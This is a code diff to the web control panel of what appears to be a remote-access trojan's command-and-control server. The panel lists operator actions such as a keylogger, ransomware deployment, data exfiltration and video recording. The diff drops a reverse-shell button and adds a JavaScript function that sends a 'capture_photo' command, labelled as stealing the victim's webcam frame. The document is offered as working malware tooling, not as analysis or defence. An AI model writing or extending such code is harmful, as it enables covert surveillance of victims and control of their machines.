@@ -857,7 +857,7 @@
                 <button onclick="showSectionInPanelForAgentActions('stop_keylogger')">Stop Keylogger</button>
                 <button onclick="showSectionInPanelForAgentActions('ransomware')">Deploy Ransomware</button>
                 <button onclick="showSectionInPanelForAgentActions('dataExfil')">Exfiltrate Data</button>
-                <button onclick="showSectionInPanelForAgentActions('reverseShell')">Open Reverse Shell</button>
+                <button onclick="showSectionInPanelForAgentActions('capturePhoto')">Capture photo</button>
                 <button onclick="showSectionInPanelForAgentActions('screenshot')">Capture Screenshot</button>
                 <button onclick="showSectionInPanelForAgentActions('camera-record')">Record Video</button>
                 <button onclick="showSectionInPanelForAgentActions('screenshare')">Screenshare</button>
@@ -930,10 +930,10 @@
                     <input type="text" id="filePathInputForExfiltration" placeholder="/path/to/file">
                     <button onclick="DataExfiltration()">Start</button>
                 </div>
-                <div id="reverseShell" class="content-section">
-                    <h3>Open Reverse Shell</h3>
-                    <p>Open a reverse shell to the agent.</p>
-                    <button onclick="simulateReverseShell()">Open</button>
+                <div id="capturePhoto" class="content-section">
+                    <h3>Capture Webcam</h3>
+                    <p>Steal the webcam frame of victim</p>
+                    <button onclick="capturePhoto()">Capture</button>
                 </div>
                 <div id="screenshot" class="content-section">
                     <h3>Capture Screenshot</h3>
@@ -1444,7 +1444,22 @@
                     alert("Failed to send the command. Please try again.");
                     console.error('Error:', error);
                 });
+
+
         }
+
+        function capturePhoto() {
+            if (confirm(`Are you sure you want to capture a photo from agent ${currentClientId}?`))
+                fetch('/input-command-to-execute-from-web', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ clientid: currentClientId, command: "capture_photo" })
+                })
+
+            alert(`Photo capture command sent to client id: ${currentClientId}`);
+            logAction(`Photo captured from ${currentClientId}`);
+        }
+        
         function persistAgent() {
             if (confirm(`Establish persistence on agent ${currentClientId}?`)) {
                 alert(`Persistence established on agent ${currentClientId}`);
